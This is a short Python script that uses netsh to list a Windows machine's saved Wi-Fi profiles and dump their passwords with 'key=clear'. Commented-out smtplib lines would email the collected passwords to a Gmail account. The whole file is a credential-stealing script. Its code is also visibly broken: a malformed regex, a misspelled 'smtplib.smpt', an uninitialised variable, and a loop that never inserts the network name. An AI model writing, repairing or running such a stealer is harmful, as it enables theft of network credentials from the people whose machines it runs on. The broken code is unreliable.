import subprocess ,smtplib ,re

command1="netsh wlan show profile"
networks=subprocess.check_output(command1,shell=True)
networks_list=re.findall("?profile\s*:\s)(.*)",networks)

output=""
for network in networks_list:
	command2="netsh wlan show profile"+"key=clear"
	one_network_result=subprocess.check_output(command2,shell=True)
	final_output += one_network_result


#server=smtplib.smpt("smtp.gmail.com",587)
#server.starttls()
#server.login(my_email,password)
#server.sendmail(my_email,my_email,final_output)
#server.quit()



